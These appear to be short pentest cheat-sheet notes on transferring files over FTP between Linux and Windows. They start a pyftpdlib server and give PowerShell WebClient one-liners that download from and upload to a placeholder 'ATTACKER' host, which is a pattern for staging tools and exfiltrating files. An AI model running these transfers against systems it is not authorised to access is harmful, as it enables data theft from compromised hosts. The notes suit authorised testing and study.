- FTP commonly used
	- TCP/20
	- TCP/21

---
## Linux --> Windows 

- Create FTP Server from Linux Machine
```bash
sudo python3 -m pyftpdlib --port 21
```
- From Windows, download file from Linux
```powershell
(New-Object Net.WebClient).DownloadFile( 'ftp://ATTACKER/file.txt', 'C:\Users\Public\file.txt' )
```
---
## Windows --> Linux

- Start the server with write permission
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
- From Windows Upload the file we want to Linux Machine
```powershell
# Specify the destination and its output file name
# Specify directory of the file we wanna upload to linux
(New-Object Net.WebClient).UploadFile( 'ftp://ATTACKER/file.txt', 'C:\path\file.txt' )
```
